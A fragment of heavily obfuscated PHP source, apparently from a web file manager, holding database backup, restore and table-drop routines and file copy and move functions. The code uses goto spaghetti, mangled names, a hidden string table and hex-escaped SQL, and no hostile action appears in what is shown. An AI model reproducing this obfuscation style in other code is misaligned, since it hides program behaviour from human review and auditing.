$this->options[$Cè²Ò…×ç[273]] = $f÷Ö¨°ƒå; } return $this; } public function limit($f÷À×ëĞÔ, $bùƒ„ìÏ©è = null) { $d²Û¹î¼šâ =& $_SERVER[«¾°Ã¤]; $this->options[$d²Û¹î¼šâ[290]] = is_null($bùƒ„ìÏ©è) ? $f÷À×ëĞÔ : $f÷À×ëĞÔ . $d²Û¹î¼šâ[47] . $bùƒ„ìÏ©è; return $this; } public function page($BËÜĞ£É¼Á, $dòíŒÆÑÑ = null) { $eªÇ©¡ÜÔ =& $_SERVER[«¾°Ã¤]; $this->options[$eªÇ©¡ÜÔ[351]] = is_null($dòíŒÆÑÑ) ? $BËÜĞ£É¼Á : $BËÜĞ£É¼Á . $eªÇ©¡ÜÔ[47] . $dòíŒÆÑÑ; return $this; } public function comment($B´ÆÔŞ†¾) { $this->options[$_SERVER[«¾°Ã¤][352]] = $B´ÆÔŞ†¾; return $this; } public function setProperty($Eˆàšõ×Œ™, $B¯¿‘°ùÙ) { if (property_exists($this, $Eˆàšõ×Œ™)) { $this->{$Eˆàšõ×Œ™} = $B¯¿‘°ùÙ; } return $this; } } goto Bˆ®ß„³Í; e¥Úİ«õòØ: class DbManage { function __construct($Ešâ©ƒ¶¤®, $e¬£©…¶ƒÜ = '') { $this->database = $Ešâ©ƒ¶¤®; $this->type = $e¬£©…¶ƒÜ; } public function model($e¾óÄƒô™§ = '') { return new ModelBase($e¾óÄƒô™§, $_SERVER[«¾°Ã¤][33], $this->database); } public function db($A×¯ „ÈÙ = false) { goto Eíª†µ³à; e®÷¼²§›‹: $f±…¢İºó¬ = $dÊµÏ³¿ í[$CªÚÄ»[930]]; $dÊµÏ³¿ í[$CªÚÄ»[930]] = $CªÚÄ»[33]; if ($dÊµÏ³¿ í[$CªÚÄ»[763]] == $CªÚÄ»[764]) { $AÈÄÁ¾¶‡š = $dÊµÏ³¿ í[$CªÚÄ»[765]]; $dÊµÏ³¿ í[$CªÚÄ»[765]] = substr($AÈÄÁ¾¶‡š, 0, strrpos($AÈÄÁ¾¶‡š, $CªÚÄ»[1018])); } goto aÊïÊïÜÈ; c½ëÊ‹³Õ«: if (!$fî¦Ï¿’©) { $aë²²™²¸„->execute("\143\162\x65\141\x74\x65\x20\144\141\x74\x61\142\141\x73\145\x20\x60{$f±…¢İºó¬}\x60"); } $dÊµÏ³¿ í[$CªÚÄ»[930]] = $f±…¢İºó¬; if ($dÊµÏ³¿ í[$CªÚÄ»[763]] == $CªÚÄ»[764]) { $dÊµÏ³¿ í[$CªÚÄ»[765]] .= $CªÚÄ»[1018] . $f±…¢İºó¬; } goto FÄ¬‡Şµ’Ü; aÊïÊïÜÈ: $this->database = $dÊµÏ³¿ í; $aë²²™²¸„ = $this->model()->db(); try { $fî¦Ï¿’© = $aë²²™²¸„->execute("\x73\x68\x6f\167\x20\144\141\164\x61\142\x61\x73\x65\x73\40\x6c\151\x6b\x65\x20\x27{$f±…¢İºó¬}\x27"); } catch (Exception $Dë¸Å¯åŒÎ) { } goto c½ëÊ‹³Õ«; FÄ¬‡Şµ’Ü: $this->database = $dÊµÏ³¿ í; $aë²²™²¸„->execute("\165\163\x65\40\x60{$f±…¢İºó¬}\140"); return $aë²²™²¸„; goto A·Ò×Ø•âª; Eíª†µ³à: $CªÚÄ» =& $_SERVER[«¾°Ã¤]; $dÊµÏ³¿ í = array_change_key_case($this->database); if ($this->type == $CªÚÄ»[9] || !$A×¯ „ÈÙ) { return $this->model()->db(); } goto e®÷¼²§›‹; A·Ò×Ø•âª: } public function createTable($b˜ÀÓ™Í, $a¤Û¼¯ãƒ¬ = null) { $DÕÑ² ßÚ =& $_SERVER[«¾°Ã¤]; if (!IO::exist($b˜ÀÓ™Í)) { ActionCall($DÕÑ² ßÚ[1019], !0, 0); show_json(LNG($DÕÑ² ßÚ[1020]), !1); } $E‘‡Ï•òÁì = sqlSplit(IO::getContent($b˜ÀÓ™Í)); foreach ($E‘‡Ï•òÁì as $Bù¨Î§‹Á) { if ($a¤Û¼¯ãƒ¬) { $d…ÍÀÈºœ£ = stripos($Bù¨Î§‹Á, $DÕÑ² ßÚ[1021]) === 0; if ($d…ÍÀÈºœ£) { $a¤Û¼¯ãƒ¬->task[$DÕÑ² ßÚ[1022]] += 1; } } $this->model()->db()->execute($Bù¨Î§‹Á); if ($a¤Û¼¯ãƒ¬ && $d…ÍÀÈºœ£) { preg_match($DÕÑ² ßÚ[1023], $Bù¨Î§‹Á, $dË‹—’Ç§); $a¤Û¼¯ãƒ¬->task[$DÕÑ² ßÚ[1024]] = $dË‹—’Ç§[1]; $a¤Û¼¯ãƒ¬->update(1); } } $this->taskToCache($a¤Û¼¯ãƒ¬); } public function insertTable($d ÔÚâ¿÷‘, $DÚÈÒ­šßÑ = null) { $CÛ—à®‡‰ë =& $_SERVER[«¾°Ã¤]; $bÍŞ¼Âèî´ = $this->model()->db(); $e‰ŒÜØ…•­ = $CÁ¾™•ÈÙ ? array($CÁ¾™•ÈÙ) : $bÍŞ¼Âèî´->getTables(); foreach ($d ÔÚâ¿÷‘ as $A¹ãÎé§ª¡) { $CÁ¾™•ÈÙ = basename($A¹ãÎé§ª¡, $CÛ—à®‡‰ë[755]); if (!in_array($CÁ¾™•ÈÙ, $e‰ŒÜØ…•­)) { continue; } if ($DÚÈÒ­šßÑ) { $DÚÈÒ­šßÑ->task[$CÛ—à®‡‰ë[1024]] = $CÁ¾™•ÈÙ; } if (get_filesize($A¹ãÎé§ª¡) == 0) { continue; } $aíÆƒõ¬µÀ = $this->sqlToDb($A¹ãÎé§ª¡, $DÚÈÒ­šßÑ); if (!$aíÆƒõ¬µÀ) { ActionCall($CÛ—à®‡‰ë[1019], !0, 0); show_json(LNG($CÛ—à®‡‰ë[1025]) . "\133{$CÁ¾™•ÈÙ}\x5d", !1); } } $this->taskToCache($DÚÈÒ­šßÑ); } public function sqlFromDb($aôŒ„¯ñˆ³, $C›—Ñ˜¦´, $aàíéàô¨ß = null, $B£Îòºµ = null) { goto Bø¥ÛŞ”í„; c†¡¶Ñ®°§: $a àãÓåÅœ = $E§Á³©—Ñç->getPk(); $aĞá¾èôÀµ = $E§Á³©—Ñç->getDbFields(); do { $e½åÈ•×í = array($a àãÓåÅœ => array($_SERVER[«¾°Ã¤][972], $F„åì×¼¸Ç)); $F•¨Â‚‰Š± = $E§Á³©—Ñç->where($e½åÈ•×í)->field($aĞá¾èôÀµ)->order($a àãÓåÅœ . $_SERVER[«¾°Ã¤][1027])->limit($EÛ”ñÓï)->select(); $F•¨Â‚‰Š± = !empty($F•¨Â‚‰Š±) ? $F•¨Â‚‰Š± : array(); if (!($FÆ‹õ‹Ó± = count($F•¨Â‚‰Š±))) { break; } $eò‘°Ø¶’¿ = end($F•¨Â‚‰Š±); $F„åì×¼¸Ç = $eò‘°Ø¶’¿[$a àãÓåÅœ]; $fç˜À¤ = array(); foreach ($F•¨Â‚‰Š± as $eÁ‡¦†ºÄõ) { if ($aôŒ„¯ñˆ³ == $_SERVER[«¾°Ã¤][1028] && $eÁ‡¦†ºÄõ[$_SERVER[«¾°Ã¤][29]] == $_SERVER[«¾°Ã¤][1029]) { $E²¦˜‘Ñœ = json_decode($eÁ‡¦†ºÄõ[$_SERVER[«¾°Ã¤][372]], !0); if ($E²¦˜‘Ñœ[$_SERVER[«¾°Ã¤][28]] == date($_SERVER[«¾°Ã¤][720]) && !$E²¦˜‘Ñœ[$_SERVER[«¾°Ã¤][719]]) { continue; } } if ($B£Îòºµ) { $eÁ‡¦†ºÄõ[$_SERVER[«¾°Ã¤][76]] = "\173\151\157\72{$B£Îòºµ}\175" . substr($eÁ‡¦†ºÄõ[$_SERVER[«¾°Ã¤][76]], strlen("\x7b\x69\157\72{$eÁ‡¦†ºÄõ[$_SERVER[«¾°Ã¤][791]]}\175")); $eÁ‡¦†ºÄõ[$_SERVER[«¾°Ã¤][791]] = $B£Îòºµ; } $fç˜À¤[] = $_SERVER[«¾°Ã¤][1030] . $this->sqlEncode($eÁ‡¦†ºÄõ) . $_SERVER[«¾°Ã¤][1031]; } $D‰½ºõÍ¾â = "\x49\x4e\123\105\x52\124\x20\111\x4e\x54\117\40\140{$aôŒ„¯ñˆ³}\x60\x20\x28\140" . implode($_SERVER[«¾°Ã¤][1032], $aĞá¾èôÀµ) . $_SERVER[«¾°Ã¤][1033]; fwrite($F•¤‚ÓŠÌ«, $D‰½ºõÍ¾â . implode($_SERVER[«¾°Ã¤][1034], $fç˜À¤) . $_SERVER[«¾°Ã¤][68] . PHP_EOL); $aÀâ¬Ÿ­à += $FÆ‹õ‹Ó±; if ($aàíéàô¨ß) { $aàíéàô¨ß->update($FÆ‹õ‹Ó±); } } while ($EÛ”ñÓï == $FÆ‹õ‹Ó±); goto bÊÏ¨¥Ü‡; bÊÏ¨¥Ü‡: fclose($F•¤‚ÓŠÌ«); return $aÀâ¬Ÿ­à; goto d¥ô¤â¥Ê; C…ñ…‚Í‚¿: $F„åì×¼¸Ç = 0; $EÛ”ñÓï = 10000; $F•¤‚ÓŠÌ« = fopen($C›—Ñ˜¦´, $_SERVER[«¾°Ã¤][1026]); goto c†¡¶Ñ®°§; Bø¥ÛŞ”í„: if ($aàíéàô¨ß) { $aàíéàô¨ß->task[$_SERVER[«¾°Ã¤][1024]] = $aôŒ„¯ñˆ³; } $E§Á³©—Ñç = $this->model($aôŒ„¯ñˆ³); $aÀâ¬Ÿ­à = 0; goto C…ñ…‚Í‚¿; d¥ô¤â¥Ê: } public function sqlToDb($cÌŒ¦•øóî, $BÎ†¡Ê¹İ = null) { goto BÌåèÎ†ä; E¹ÃßÁİµ²: if (!empty($c”º’×±¨¸)) { $aº»»¯”ã = $cİ¤ôò‡‹» . implode($E›£Ñ¶ˆ§´[47], $c”º’×±¨¸); if (!$B‡¡–Ûï—´->execute($aº»»¯”ã)) { return !1; } if ($BÎ†¡Ê¹İ) { $BÎ†¡Ê¹İ->update($e‚Ì´–Ü§); } } return !0; goto CÃ˜®¢‚ºå; eœ³ñÌêáã: $c”º’×±¨¸ = array(); $DÑ‚ƒÖÊâé = $this->type == $E›£Ñ¶ˆ§´[9] ? 500 : 2000; $E³Ï•¾—¥´ = basename($cÌŒ¦•øóî, $E›£Ñ¶ˆ§´[755]); goto dÚ×Á©ñ¥‡; dÚ×Á©ñ¥‡: if ($E³Ï•¾—¥´ == $E›£Ñ¶ˆ§´[1036]) { $DÑ‚ƒÖÊâé = 50; } while (!feof($F„«âé¯éƒ)) { $båß¶¼Ä„¸ = trim(fgets($F„«âé¯éƒ)); if (!$båß¶¼Ä„¸) { continue; } $aº»»¯”ã = $this->sqlDecode($båß¶¼Ä„¸, $this->type); if (stripos($aº»»¯”ã, $E›£Ñ¶ˆ§´[355]) === 0) { if (!$cİ¤ôò‡‹») { $cİ¤ôò‡‹» = $aº»»¯”ã . $E›£Ñ¶ˆ§´[50]; } continue; } if ($BÎ†¡Ê¹İ) { $BÎ†¡Ê¹İ->task[$E›£Ñ¶ˆ§´[1022]] += 1; } $e‚Ì´–Ü§++; $c”º’×±¨¸[] = rtrim(rtrim(trim($aº»»¯”ã), $E›£Ñ¶ˆ§´[47]), $E›£Ñ¶ˆ§´[68]); if ($e‚Ì´–Ü§ >= $DÑ‚ƒÖÊâé) { $aº»»¯”ã = $cİ¤ôò‡‹» . implode($E›£Ñ¶ˆ§´[47], $c”º’×±¨¸); if (!$B‡¡–Ûï—´->execute($aº»»¯”ã)) { return !1; } if ($BÎ†¡Ê¹İ) { $BÎ†¡Ê¹İ->update($e‚Ì´–Ü§); } $c”º’×±¨¸ = array(); $e‚Ì´–Ü§ = 0; } } fclose($F„«âé¯éƒ); goto E¹ÃßÁİµ²; BÌåèÎ†ä: $E›£Ñ¶ˆ§´ =& $_SERVER[«¾°Ã¤]; $B‡¡–Ûï—´ = $this->model()->db(); $F„«âé¯éƒ = @fopen($cÌŒ¦•øóî, $E›£Ñ¶ˆ§´[1035]); goto dÒ­†¬ìÔ; dÒ­†¬ìÔ: if (!$F„«âé¯éƒ) { return !1; } $e‚Ì´–Ü§ = 0; $cİ¤ôò‡‹» = $E›£Ñ¶ˆ§´[33]; goto eœ³ñÌêáã; CÃ˜®¢‚ºå: } public function dropTable($e®Ì÷Æ½‹É = null) { $FêÈàÆ—¡ğ = $this->model()->db(); $d®ô¦¿Š = $e®Ì÷Æ½‹É ? array($e®Ì÷Æ½‹É) : $FêÈàÆ—¡ğ->getTables(); if (!$d®ô¦¿Š) { return; } foreach ($d®ô¦¿Š as $e®Ì÷Æ½‹É) { $FêÈàÆ—¡ğ->execute("\x64\162\157\160\x20\x74\x61\142\154\x65\x20\151\x66\40\145\x78\151\x73\164\163\40\x60{$e®Ì÷Æ½‹É}\x60"); } } private function taskToCache($AÎ°ƒšÇ = null) { $eÒªö†¥Ë =& $_SERVER[«¾°Ã¤]; if (!$AÎ°ƒšÇ) { return; } $bœ±ç£„¬ƒ = array($eÒªö†¥Ë[1024] => $AÎ°ƒšÇ->task[$eÒªö†¥Ë[1024]], $eÒªö†¥Ë[1022] => $AÎ°ƒšÇ->task[$eÒªö†¥Ë[1022]], $eÒªö†¥Ë[1037] => $AÎ°ƒšÇ->task[$eÒªö†¥Ë[1037]]); if ($bœ±ç£„¬ƒ[$eÒªö†¥Ë[1022]] == $bœ±ç£„¬ƒ[$eÒªö†¥Ë[1037]]) { $bœ±ç£„¬ƒ[$eÒªö†¥Ë[729]] = 1; } Cache::set($eÒªö†¥Ë[1038] . $AÎ°ƒšÇ->task[$eÒªö†¥Ë[393]], $bœ±ç£„¬ƒ); $AÎ°ƒšÇ->end(); } private function sqlEncode($a‰‹“¬¤­) { $cŒ«À˜®Ùº =& $_SERVER[«¾°Ã¤]; $dùØôæ±ÓÈ = array(); foreach ($a‰‹“¬¤­ as $E“…‹Ùóæ) { if (is_array($E“…‹Ùóæ)) { $E“…‹Ùóæ = json_encode_force($E“…‹Ùóæ); } $E“…‹Ùóæ = addslashes($E“…‹Ùóæ); $E“…‹Ùóæ = str_replace(array($cŒ«À˜®Ùº[1039], $cŒ«À˜®Ùº[229]), array($cŒ«À˜®Ùº[1040], $cŒ«À˜®Ùº[1041]), $E“…‹Ùóæ); $dùØôæ±ÓÈ[] = str_replace($cŒ«À˜®Ùº[55], $cŒ«À˜®Ùº[1042], $E“…‹Ùóæ); } return $cŒ«À˜®Ùº[55] . implode($cŒ«À˜®Ùº[1043], $dùØôæ±ÓÈ) . $cŒ«À˜®Ùº[55]; } private function sqlDecode($D“ƒ¼‘îè, $C²œÃ„–Ç) { $bä®Åçëç =& $_SERVER[«¾°Ã¤]; $D“ƒ¼‘îè = str_replace(array($bä®Åçëç[1040], $bä®Åçëç[1041]), array($bä®Åçëç[1039], $bä®Åçëç[229]), $D“ƒ¼‘îè); if ($C²œÃ„–Ç == $bä®Åçëç[9]) { $D“ƒ¼‘îè = stripslashes($D“ƒ¼‘îè); } return $D“ƒ¼‘îè; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($f²Çµ†ñ¸Ï, $aØò„†‚“„) { goto f—±»ÃËŒØ; BµÎÉøÎ›‚: Hook::trigger($e²—À¥¼‘í[1045] . $f²Çµ†ñ¸Ï . $e²—À¥¼‘í[1048], $Dİ›—Ÿòå‚, $E«Ö¯ÕÚÉ); return $E«Ö¯ÕÚÉ; goto dóïØêãò; eÚ÷¬Ûƒìî: Hook::trigger($e²—À¥¼‘í[1045] . $f²Çµ†ñ¸Ï . $e²—À¥¼‘í[1046], $Dİ›—Ÿòå‚); $Dì¢™Àİ´ = self::driverMake($aØò„†‚“„[0]); if (method_exists($Dì¢™Àİ´, $f²Çµ†ñ¸Ï)) { $E«Ö¯ÕÚÉ = @call_user_func_array(array($Dì¢™Àİ´, $f²Çµ†ñ¸Ï), $aØò„†‚“„); } else { if (method_exists($Dì¢™Àİ´, $e²—À¥¼‘í[1047])) { $E«Ö¯ÕÚÉ = @call_user_func_array(array($Dì¢™Àİ´, $f²Çµ†ñ¸Ï), $aØò„†‚“„); } else { if (method_exists(self, $f²Çµ†ñ¸Ï)) { $E«Ö¯ÕÚÉ = @call_user_func_array(array(self, $f²Çµ†ñ¸Ï), $aØò„†‚“„); } else { $E«Ö¯ÕÚÉ = call_user_func_array(array(parent, $f²Çµ†ñ¸Ï), $aØò„†‚“„); } } } goto BµÎÉøÎ›‚; f—±»ÃËŒØ: $e²—À¥¼‘í =& $_SERVER[«¾°Ã¤]; $Dİ›—Ÿòå‚ = $aØò„†‚“„; $GLOBALS[$e²—À¥¼‘í[1044]] = $e²—À¥¼‘í[1045] . $f²Çµ†ñ¸Ï; goto eÚ÷¬Ûƒìî; dóïØêãò: } public static function init($A¢ò¯Ÿ±ïØ) { return self::driverMake($A¢ò¯Ÿ±ïØ); } public static function copy($aªšÎÃè¯É, $bóö‹èé·ò, $Dù‰è–¥× = false, $AØÏÄˆ»ğ— = false) { return self::copyMoveStart($aªšÎÃè¯É, $bóö‹èé·ò, $Dù‰è–¥×, $_SERVER[«¾°Ã¤][527], $AØÏÄˆ»ğ—); } public static function move($CÈËçÜ‘Á™, $Aæ¡ñ¦Â³í, $cì³òçì•Ë = false, $f±—Ğğ¬ø† = false) { return self::copyMoveStart($CÈËçÜ‘Á™, $Aæ¡ñ¦Â³í, $cì³òçì•Ë, $_SERVER[«¾°Ã¤][529], $f±—Ğğ¬ø†); } private static function copyMoveStart($E»¦ßÊßƒ, $fŞõ˜„İàˆ, $C©ÜÜİˆŞË, $fùŸ×šÓ¬, $A„©‰ÍœÜ§) { $EéŠ¿İ„ =& $_SERVER[«¾°Ã¤]; $få¡’ÅÑ¬å = array($E»¦ßÊßƒ, $fŞõ˜„İàˆ, $C©ÜÜİˆŞË, $A„©‰ÍœÜ§); Hook::trigger($EéŠ¿İ„[1045] . $fùŸ×šÓ¬ . $EéŠ¿İ„[1046], $få¡’ÅÑ¬å); $Aè‰ ç† = self::copyMove($E»¦ßÊßƒ, $fŞõ˜„İàˆ, $C©ÜÜİˆŞË, $fùŸ×šÓ¬, $A„©‰ÍœÜ§); Hook::trigger($EéŠ¿İ„[1045] . $fùŸ×šÓ¬ . $EéŠ¿İ„[1048], $få¡’ÅÑ¬å, $Aè‰ ç†); return $Aè‰ ç†; } public static function saveFile($a‚ÚªŞÖÁ, $F¬ó¢ÒŞ¬±, $DÉŸÒ¥ä¼ = true) { goto aÜª«ùÚµ¶; FÏ”Áº…óÕ: $D¿àĞì°ïğ = $FÑîÁÎÜ£Å->pathFather($F¬ó¢ÒŞ¬±); $FÚ¿¸¿ì¬– = !0; if (!$DÉŸÒ¥ä¼ && self::driverIsSame($EŞÀ†ùßÕí, $FÑîÁÎÜ£Å)) { $FÚ¿¸¿ì¬– = !1; } goto cŠÑÙˆÈ¤; aÜª«ùÚµ¶: $eË©ˆÍ¶¼ö =& $_SERVER[«¾°Ã¤]; $CÒÁùÂ­§Ô = self::info($F¬ó¢ÒŞ¬±); $EŞÀ†ùßÕí = self::driverMake($a‚ÚªŞÖÁ); goto e‰Áö‰Ó¿Õ; cŠÑÙˆÈ¤: $d¤¦Û«Ä¹Õ = self::copyFile($EŞÀ†ùßÕí, $a‚ÚªŞÖÁ, $FÑîÁÎÜ£Å, $D¿àĞì°ïğ, $CÒÁùÂ­§Ô[$eË©ˆÍ¶¼ö[28]], $FÚ¿¸¿ì¬–); if ($ağÇÖœˆä¼) { $d¤¦Û«Ä¹Õ = $ağÇÖœˆä¼->getPathOuter($d¤¦Û«Ä¹Õ); } return $d¤¦Û«Ä¹Õ; goto d¯Š¸Å¾Ê; e‰Áö‰Ó¿Õ: $FÑîÁÎÜ£Å = self::driverMake($F¬ó¢ÒŞ¬±); $ağÇÖœˆä¼ = !1; if ($FÑîÁÎÜ£Å->pathParse[$eË©ˆÍ¶¼ö[1049]]) { $a«±ŞÔÒóç = $FÑîÁÎÜ£Å->pathParse[$eË©ˆÍ¶¼ö[1049]]; $ağÇÖœˆä¼ = $FÑîÁÎÜ£Å; $FÑîÁÎÜ£Å = self::driverMake($a«±ŞÔÒóç); } goto FÏ”Áº…óÕ; d¯Š¸Å¾Ê: } private static function copyMove($aÜ²Ğ¹½†, $fãáÃ¬…Â, $B·­­Š„ÀÄ, $fÆ½´’¢õ, $bƒÓ‰£çÃ = false) { goto DÌ«¿§ÛÀò; B¹Û¡·æõ¢: if ($dİŸä®’ïô) { $a–ÜŠ‡Í” = $dİŸä®’ïô->getPathOuter($a–ÜŠ‡Í”); } return $a–ÜŠ‡Í”; goto Aß±”™œÈÖ; eÖ ò÷´ğ¤: $FõÚì¤‘“â = $d è»´™ã->isFile($aÜ²Ğ¹½†); if (!$FõÚì¤‘“â && $EÚ¿Ä§†³…->getType() == $bŸÎçÖ¿–Œ[727] && $d è»´™ã->getType() == $bŸÎçÖ¿–Œ[106]) { $a–ÜŠ‡Í” = $EÚ¿Ä§†³…->copyFolderFromIO($d è»´™ã, $aÜ²Ğ¹½†, $fãáÃ¬…Â, $B·­­Š„ÀÄ, $AºõÙ‡áƒ, $bƒÓ‰£çÃ); } else { $a–ÜŠ‡Í” = self::copyPath($d è»´™ã, $aÜ²Ğ¹½†, $EÚ¿Ä§†³…, $fãáÃ¬…Â, $B·­­Š„ÀÄ, $AºõÙ‡áƒ, $FõÚì¤‘“â, $bƒÓ‰£çÃ); } if ($a–ÜŠ‡Í” && $AºõÙ‡áƒ) { $d è»´™ã->remove($aÜ²Ğ¹½†); } goto B¹Û¡·æõ¢; DÌ«¿§ÛÀò: $bŸÎçÖ¿–Œ =& $_SERVER[«¾°Ã¤]; if (!$aÜ²Ğ¹½† || $aÜ²Ğ¹½† == $bŸÎçÖ¿–Œ[8] || !$fãáÃ¬…Â) { return !1; } ignore_timeout(); goto a´ÏŸ®¥Ô„; eÙß‰Åë§Ü: $dİŸä®’ïô = !1; if ($EÚ¿Ä§†³…->pathParse[$bŸÎçÖ¿–Œ[1049]]) { $fãáÃ¬…Â = $EÚ¿Ä§†³…->pathParse[$bŸÎçÖ¿–Œ[1049]]; $dİŸä®’ïô = $EÚ¿Ä§†³…; $EÚ¿Ä§†³… = self::driverMake($fãáÃ¬…Â); } self::check($d è»´™ã, $aÜ²Ğ¹½†, $EÚ¿Ä§†³…, $fãáÃ¬…Â); goto fâ¤Ú¤™ğÛ; fâ¤Ú¤™ğÛ: Hook::trigger($bŸÎçÖ¿–Œ[73], $d è»´™ã, $aÜ²Ğ¹½†, $EÚ¿Ä§†³…, $fãáÃ¬…Â); $C‘í‚·¶¦ö = self::driverIsSame($d è»´™ã, $EÚ¿Ä§†³…); if ($C‘í‚·¶¦ö) { if ($fÆ½´’¢õ == $bŸÎçÖ¿–Œ[529] && !method_exists($EÚ¿Ä§†³…, $bŸÎçÖ¿–Œ[1050]) && trim($fãáÃ¬…Â, $bŸÎçÖ¿–Œ[8]) == trim($EÚ¿Ä§†³…->pathFather($aÜ²Ğ¹½†), $bŸÎçÖ¿–Œ[8])) { if ($d è»´™ã->pathThis($aÜ²Ğ¹½†) != $bƒÓ‰£çÃ && !$d è»´™ã->isTypeObject()) { return $d è»´™ã->rename($aÜ²Ğ¹½†, $bƒÓ‰£çÃ); } return $EÚ¿Ä§†³…->getPathOuter($aÜ²Ğ¹½†); } if (method_exists($EÚ¿Ä§†³…, $fÆ½´’¢õ)) { return $EÚ¿Ä§†³…->{$fÆ½´’¢õ}($aÜ²Ğ¹½†, $fãáÃ¬…Â, $B·­­Š„ÀÄ); } } goto eÖ ò÷´ğ¤; a´ÏŸ®¥Ô„: $d è»´™ã = self::driverMake($aÜ²Ğ¹½†); $EÚ¿Ä§†³… = self::driverMake($fãáÃ¬…Â); $AºõÙ‡áƒ = $fÆ½´’¢õ == $bŸÎçÖ¿–Œ[529]; goto eÙß‰Åë§Ü; Aß±”™œÈÖ: } private static function check($a§ƒ¢¶ì•ö, $d–„Â²î¥İ, $DÚØ¡†”è¸, &$dá³¡ùìÈÂ) { $f‚Àî‘ÁÅÓ =& $_SERVER[«¾°Ã¤]; if (self::driverIsSame($a§ƒ¢¶ì•ö, $DÚØ¡†”è¸) && $a§ƒ¢¶ì•ö->isFolder($d–„Â²î¥İ) && $a§ƒ¢¶ì•ö->isParentOf($d–„Â²î¥İ, $dá³¡ùìÈÂ)) { show_json(LNG($f‚Àî‘ÁÅÓ[1051]), !1); } if (!$a§ƒ¢¶ì•ö->exist($d–„Â²î¥İ)) { show_json(LNG($f‚Àî‘ÁÅÓ[105]), !1); } } private static function copyPath($f“Š‰ÎŒˆ¨, $C«Ú±”½äµ, $BºëîÓ©†ë, $DÆ¾Ûô‹ïÇ, $D­×Å—Ôò, $aëóÈó“´ğ, $c†Å°¨„Ë, $CÛ—Ò†±ƒ© = false) { goto d‹ô·…Ùê; bê™‚†ëßì: self::copyMoveKeepInfo($f“Š‰ÎŒˆ¨, $C«Ú±”½äµ, $e˜µ§âàªÕ); return $e˜µ§âàªÕ; goto D‘ƒ‚Ç¥Ó¦; aæè––»•: $C’¾Õ‚Ûø = is_array($C’¾Õ‚Ûø) ? $C’¾Õ‚Ûø : array($CóÍÙ–÷…[74] => array(), $CóÍÙ–÷…[75] => array()); $E¶²ÁÂíªí = array_merge($C’¾Õ‚Ûø[$CóÍÙ–÷…[74]], $C’¾Õ‚Ûø[$CóÍÙ–÷…[75]]); foreach ($E¶²ÁÂíªí as $céÈ³á×øÛ) { $C”Å¨Ç“‹™ = $céÈ³á×øÛ[$CóÍÙ–÷…[29]] == $CóÍÙ–÷…[193]; $C«Ú±”½äµ = $f“Š‰ÎŒˆ¨->getPathInner($céÈ³á×øÛ[$CóÍÙ–÷…[76]]); $E„æÂÓìŒ = self::copyPath($f“Š‰ÎŒˆ¨, $C«Ú±”½äµ, $BºëîÓ©†ë, $DÆ¾Ûô‹ïÇ, $D­×Å—Ôò, $aëóÈó“´ğ, $C”Å¨Ç“‹™); if (!$E„æÂÓìŒ) { IO::errorTips($CóÍÙ–÷…[1052] . $C«Ú±”½äµ . $CóÍÙ–÷…[67] . $DÆ¾Ûô‹ïÇ); } } goto bê™‚†ëßì; B¹¿İ÷¡: if ($c†Å°¨„Ë) { return self::copyFile($f“Š‰ÎŒˆ¨, $C«Ú±”½äµ, $BºëîÓ©†ë, $DÆ¾Ûô‹ïÇ, $dç¥¤õ¶×Á, $aëóÈó“´ğ); } if ($D­×Å—Ôò == REPEAT_RENAME_FOLDER) { $D­×Å—Ôò = !1; } $A‘›÷®œ¥ = rtrim($DÆ¾Ûô‹ïÇ, $CóÍÙ–÷…[8]) . $CóÍÙ–÷…[8] . $dç¥¤õ¶×Á; goto D³®ãÁ¯…ó; D³®ãÁ¯…ó: $e˜µ§âàªÕ = $BºëîÓ©†ë->mkdir($BºëîÓ©†ë->getPath($A‘›÷®œ¥)); $DÆ¾Ûô‹ïÇ = $BºëîÓ©†ë->getPathInner($e˜µ§âàªÕ); $C’¾Õ‚Ûø = $f“Š‰ÎŒˆ¨->listPath($C«Ú±”½äµ, !0); goto aæè––»•; d‹ô·…Ùê: $CóÍÙ–÷… =& $_SERVER[«¾°Ã¤]; $dç¥¤õ¶×Á = empty($CÛ—Ò†±ƒ©) && $CÛ—Ò†±ƒ© !== $CóÍÙ–÷…[191] ? $f“Š‰ÎŒˆ¨->pathThis($C«Ú±”½äµ) : $CÛ—Ò†±ƒ©; if ($D­×Å—Ôò) { $AÙ¸³¯Ô¼Î = $BºëîÓ©†ë->fileNameExist($DÆ¾Ûô‹ïÇ, $dç¥¤õ¶×Á); $dç¥¤õ¶×Á = $BºëîÓ©†ë->fileNameAuto($DÆ¾Ûô‹ïÇ, $dç¥¤õ¶×Á, $D­×Å—Ôò, !$c†Å°¨„Ë); $D­×Å—Ôò = $AÙ¸³¯Ô¼Î ? $D­×Å—Ôò : !1; } goto B¹¿İ÷¡; D‘ƒ‚Ç¥Ó¦: } private static function copyFile($F´•ßÍêŠŠ, $EÓ»Ùîâ‘ê, $D°†•³‰–Ÿ, $D£½í‡Â¿, $Aá˜Ò‹Ñ‰ğ, $c÷Ç¶“Ìˆæ) { goto b£•ã·ÜÑ; F–‹Ë¿¨: $fĞšËÂï·˜ = $F´•ßÍêŠŠ->download($EÓ»Ùîâ‘ê, $fĞšËÂï·˜); $fĞšËÂï·˜ = $F´•ßÍêŠŠ->iconvApp($fĞšËÂï·˜); $dö…Ø­å¦¿ = $D°†•³‰–Ÿ->upload($D£½í‡Â¿, $fĞšËÂï·˜, $c÷Ç¶“Ìˆæ); goto e­ËŒ˜†ğ; e­ËŒ˜†ğ: self::remove($fòà¸ºğì×); Hook::trigger($DŸÊ‰°ˆ É[1055], $F´•ßÍêŠŠ, $EÓ»Ùîâ‘ê, $D°†•³‰–Ÿ, $D£½í‡Â¿, $Aá˜Ò‹Ñ‰ğ, $dö…Ø­å¦¿); self::copyMoveKeepInfo($F´•ßÍêŠŠ, $EÓ»Ùîâ‘ê, $dö…Ø­å¦¿); goto DŞùİï•³³; DŞùİï•³³: return $dö…Ø­å¦¿; goto dŒšêÆ†ÕÉ; D¯Ğõ“…˜Æ: Hook::trigger($DŸÊ‰°ˆ É[1054], $F´•ßÍêŠŠ, $EÓ»Ùîâ‘ê, $D°†•³‰–Ÿ, $D£½í‡Â¿, $Aá˜Ò‹Ñ‰ğ, $eğ¨Û——“ƒ); if (self::driverIsSame($F´•ßÍêŠŠ, $D°†•³‰–Ÿ)) { if ($c÷Ç¶“Ìˆæ) { $dö…Ø­å¦¿ = $D°†•³‰–Ÿ->moveFile($EÓ»Ùîâ‘ê, $D£½í‡Â¿); } else { $dö…Ø­å¦¿ = $D°†•³‰–Ÿ->copyFile($EÓ»Ùîâ‘ê, 